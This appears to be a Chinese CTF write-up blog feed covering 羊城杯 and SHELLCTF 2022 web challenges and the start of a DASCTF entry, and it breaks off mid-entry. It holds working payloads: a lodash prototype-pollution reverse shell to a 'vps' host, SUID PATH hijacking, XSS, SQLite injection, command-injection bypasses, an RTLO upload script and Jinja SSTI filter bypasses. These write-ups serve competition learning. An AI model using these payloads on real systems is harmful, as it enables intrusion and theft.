class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/ctf&#x27;</span>, &#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>));</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">admin</span> === <span class="literal">undefined</span> || req.<span class="property">session</span>.<span class="property">admin</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// login</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">data</span> !== <span class="literal">undefined</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">data</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">real_name</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">realname</span>,</span><br><span class="line">            <span class="attr">age</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">age</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">real_name</span>: <span class="string">&#x27;Undefined&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="string">&#x27;Undefined&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// update your info</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;update.ejs&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">realname</span>: <span class="string">&#x27;&#x27;</span>, <span class="attr">age</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">realname</span>) &#123;</span><br><span class="line">          res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span>;</span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listening on http://%s:%s&quot;</span>, host, port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>lodash.merge原型链污染</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904025029642.png" alt="image-20220904025029642"></p><p>找一个payload</p><p><a href="https://www.viewofthai.link/2022/04/22/lodash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">lodash原型链污染 – View of Thai</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904025332243.png" alt="image-20220904025332243"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">tHe_pAsSw0rd_thAt_y0u_NeVer_Kn0w</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/7002 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>使用postman发包，进行原型链污染</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904073919262.png" alt="image-20220904073919262"></p><p>提权</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">/home/bunny</span><br></pre></td></tr></table></figure><p>发现&#x2F;home&#x2F;bunny</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904073244718.png" alt="image-20220904073244718"></p><p>根据&#x2F;home&#x2F;bunny的回显，推测是用了id命令，想办法替换id命令</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904074238796.png" alt="image-20220904074238796"></p><p>但是无论是替换，还是删除，权限都不够</p><p>后来发现，可以使用export来设置PATH的环境变量，将PATH设置为tmp目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>执行id命令的时候，会优先到tmp目录寻找并执行命令</p><p>在tmp目录下构造恶意的id命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; /tmp/id</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/id</span><br></pre></td></tr></table></figure><p>然后执行&#x2F;home&#x2F;bunny</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904082059141.png" alt="image-20220904082059141"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHELLCTF2022复现</title>
      <link href="/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SHELLCTF2022复现"><a href="#SHELLCTF2022复现" class="headerlink" title="SHELLCTF2022复现"></a>SHELLCTF2022复现</h1><h2 id="Choosy"><a href="#Choosy" class="headerlink" title="Choosy"></a>Choosy</h2><blockquote><p>Single solution doesn’t works on all problems. One should try different solutions for different problem.</p><p>Flag format:- shellctf{H3re_1s_tH3_F14g}</p><p><a href="http://20.125.142.38:8324/">http://20.125.142.38:8324</a></p><p>Alternate link <a href="http://20.193.247.209:8333/">http://20.193.247.209:8333/</a></p></blockquote><p>这个打开之后是这样的</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505854105.png" alt="img"></p><p>功能是输入大写字母，返回小写字母，数字和字符不变。本来是想的是SSTI，但是怎么尝试也不行，看了wp才知道是xss</p><p>这个会解析html标签，但是会过滤script，可以使用img标签</p><p>onerror，在加载图片错误时执行javascript</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855106.png" alt="img"></p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855107.png" alt="img"></p><h2 id="Colour-Cookie"><a href="#Colour-Cookie" class="headerlink" title="Colour Cookie"></a>Colour Cookie</h2><p>题目描述：</p><blockquote><p>Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.</p><p>Flag format :- shellctf{H3re_1s_F14g}</p><p><a href="http://20.125.142.38:8326/">http://20.125.142.38:8326</a></p><p><a href="http://20.193.247.209:8222/">http://20.193.247.209:8222/</a></p></blockquote><p>在&#x2F;static&#x2F;base_cookie.css中找到</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*   name=&quot;C0loR&quot;  */</span></span><br></pre></td></tr></table></figure><p>并且题目提示<code>Blue is my favourite colour</code>，但是受题目名称影响，在cookie上下工夫了，想偏了</p><p>正解应该是传参<code>C0loR=Blue</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8326/check?C0loR=Blue</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855108.png" alt="img"></p><h2 id="Extractor"><a href="#Extractor" class="headerlink" title="Extractor"></a>Extractor</h2><p>题目描述：</p><blockquote><p>We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.</p><p>Flag format :- shellctf{H3re_1s_tH3_fL4G}</p><p><a href="http://20.125.142.38:8956/">http://20.125.142.38:8956</a></p><p>Alternate URL :- <a href="http://20.193.247.209:8555/">http://20.193.247.209:8555/</a></p><p>More Alternate URL :- <a href="http://52.66.29.74:8999/">http://52.66.29.74:8999/</a></p></blockquote><p>有注册和登录两个功能</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855109.png" alt="img"></p><p>但是我测试的时候，即使不注册，也可以登录成功，不过返回的信息为空，如下</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855110.png" alt="img"></p><p>正常注册登录，就会返回用户注册的相关信息</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855111.png" alt="img"></p><p>同时注意url的变化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555&amp;pass=555&amp;content=555</span></span><br></pre></td></tr></table></figure><p>进行sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555%27--+</span></span><br></pre></td></tr></table></figure><p>回显</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855112.png" alt="img"></p><p>判断字段数为4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855113.png" alt="img"></p><p>但是我想使用database()，version()来进一步测试的时候，回显错误，所以应该不是mysql</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855114.png" alt="img"></p><p>看师傅们的wp才知道是sqlite注入</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p><p>测试数据库版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="title function_ invoke__">sqlite_version</span>()--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855115.png" alt="img"></p><p>注意3.30版本后sqlite_master才改名sqlite_schema,所以应该用sqlite_master。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,sql+FROM+sqlite_master--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855116.png" alt="img"></p><p>最后，不用区分大小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,content+FROM+admins--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855117.png" alt="img"></p><h2 id="ILLUSION"><a href="#ILLUSION" class="headerlink" title="ILLUSION"></a>ILLUSION</h2><p>考点：命令注入</p><p>对关键命令替换为空，可以使用双写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8765/wH4t_Y0u_d1d?inn=llss</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856118.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;llss</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856119.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;llss</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856120.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856121.png" alt="img"></p><h2 id="Doc-Holder"><a href="#Doc-Holder" class="headerlink" title="Doc Holder"></a>Doc Holder</h2><p>题目描述：</p><blockquote><p>Can you share portable document with us which looks like it when we seet portable document with eyes but ti’s not actually portable document.</p><p>More a misc problem …</p><p>My Favourite move is Inferno overwrite </p><p><a href="http://20.125.142.38:8508/">http://20.125.142.38:8508</a></p><p>Alternate Link :- <a href="http://20.193.247.209:8666/">http://20.193.247.209:8666/</a></p><p>Hint — Challenge is all about file extension of the file that you are uploading….</p><p>Hint1: Think from right to left Hint2: Everything is just related to name and extension of file not content in file … Hint3: Give me file with name while when seen from eyes look like abc.pdf but its not actually pdf Hint4: Make file name “abc.fdp” look “abc.pdf”</p></blockquote><p>不允许文件名后缀为pdf，但是要让服务端解析为pdf</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856122.png" alt="img"></p><p><code>实现的方法是用控制字符，将fdp从右往左解析为pdf</code>(不清楚原理，用python测试的结果如下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="string">u&#x27;\u200f&#x27;</span>, <span class="string">u&#x27;\u202b&#x27;</span>, <span class="string">u&#x27;\u202e&#x27;</span>, <span class="string">u&#x27;\u2067&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    filename = <span class="string">&quot;sk1y.&quot;</span> + i + <span class="string">&quot;fdp&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856123.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://20.125.142.38:8508/&#x27;</span></span><br><span class="line">filename = <span class="string">&quot;abc.&quot;</span>+<span class="string">u&#x27;\u202e&#x27;</span>+<span class="string">&quot;fdp&quot;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (filename, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;application/pdf&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857124.png" alt="img"></p><p>同时在burpsuite测试的时候，发现在文件名前加上字符，并且为单引号，并且后面含有<code>fdp</code>，也可以成功</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857125.png" alt="img"></p><p>但是用双引号就不行</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857126.png" alt="img"></p><p>这一点还是不太理解</p><p>不过需要fdp才能成功，估计也是从右往左之类的原因</p><h2 id="RAW-Agent"><a href="#RAW-Agent" class="headerlink" title="RAW Agent"></a>RAW Agent</h2><p>题目描述：</p><blockquote><p>Day By Day Pollution is increasing, passing polluted environment and sum of all generation till now will take you to ultimate end.</p><p>Flag Format :- Enclose everything in shellctf{} Flag have two part :- shellctf{part1part2}</p><p>Part 1 start with :- U</p><p>Part 2 start with :- _p</p><p>Challenge url :- <a href="http://20.125.142.38:8525/">http://20.125.142.38:8525/</a></p><p>Alternate URL :- <a href="http://20.193.247.209:8777/">http://20.193.247.209:8777/</a></p><p>More Alternate URL :- <a href="http://52.66.29.74:8888/">http://52.66.29.74:8888/</a></p></blockquote><p>flag包括两部分，第一部分第一个字母为U，第二部分第一个字母为p</p><p>就是个Misc，不管了</p><h2 id="More-ILLUSION"><a href="#More-ILLUSION" class="headerlink" title="More ILLUSION"></a>More ILLUSION</h2><p>题目描述：</p><blockquote><p>If you still not illuded, here is another potion of illusion for you. Can you survive it ?????</p><p>You can <strong>du</strong> it ……..</p><p>Flag format :- enclose entire thing in shellctf{}</p><ul><li><p>A - Thing you got after solving problem</p></li><li><p>B - Linux command (not entire command but specific one command that lead you to solution, ex- “cd .. ; ls -la” was command that showed me thing which lead me to flag then special command is “ls” and argument is “la”)</p></li></ul><p>Example flag -</p><ul><li>Suppose I got string “H3re_1s_F1ag” from solving so my A &#x3D; H3re_1s_F1ag</li></ul><p>Some charaters are ommited complete the flag with all description above in below flag. ommited character corresponds to arguments of that you du.</p><p>After “H3re_1s_F1ag” one is special command rest are its arguments.</p><p>shellctf{H3re_1s_F1ag_xx_appaxxxx-xxxx_ah}</p><p>Challenge url :- <a href="http://20.125.142.38:8499/">http://20.125.142.38:8499/</a></p><p>Alternate URL :- <a href="http://52.66.29.74:8871/">http://52.66.29.74:8871/</a></p><p>More Alternate URL :- <a href="http://20.193.247.209:8822/">http://20.193.247.209:8822/</a></p></blockquote><p>参考ek1ng师傅的解法，使用do命令</p><blockquote><p>Linux du （英文全拼：disk usage）命令用于显示目录或文件的大小。</p><p>du 会显示指定的目录或文件所占用的磁盘空间。</p><p>-a或-all 显示目录中个别文件的大小。</p><p>-h或–human-readable 以K，M，G为单位，提高信息的可读性。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;dduu --apparent-size -ah</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857127.png" alt="img"></p><p>使用<a href="https://cyberchef.org/">https://cyberchef.org/</a> 进行整理</p><p>选择From HTML Entity 和 Unescape string 进行整理</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857128.png" alt="img"></p><p>选择一个大小为38的</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857129.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;<span class="built_in">cat</span> ./flag-------------/flag/flag/flag/flag/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857130.png" alt="img"></p><p>包上shellctf{}即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>打国外的比赛还是太少了，经验不够，思路比较局限，比如第一个题目的xss，sqlite注入等等，还要继续努力学</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://ek1ng.com/SHELLCTF2022.html">https://ek1ng.com/SHELLCTF2022.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> SHELLCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07赋能赛复现</title>
      <link href="/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF2022-07赋能赛复现"><a href="#DASCTF2022-07赋能赛复现" class="headerlink" title="DASCTF2022.07赋能赛复现"></a>DASCTF2022.07赋能赛复现</h1><p>[toc]</p><h2 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h2><p>会检查上传的文件的内容，不能存在php,可以使用短标签绕过，但是不知道文件上传的存放路径。</p><p>本来以为是文件上传，但是没想到是任意文件读取！！！</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220730174626603.png" alt="image-20220730174626603"></p><h2 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h2><p>fuzz，过滤了很多的关键词</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220731131121372.png" alt="image-20220731131121372"></p><p>其中大括号可以使用<code>&#123;%print(......)%&#125;</code>或<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>的形式来代替，而print被过滤，所以用后者</p><p>根据过滤信息，<code>[]</code>，<code>点</code>，<code>class</code>等关键词都被过滤，所以使用attr和unicode编码进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>.__class__)%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>如果执行成功，回显555</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220731180108482.png" alt="image-20220731180108482"></p><p>因为只能根据是否回显555来判断，相当于盲注，所以用自动化脚本来判断寻找可以用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span 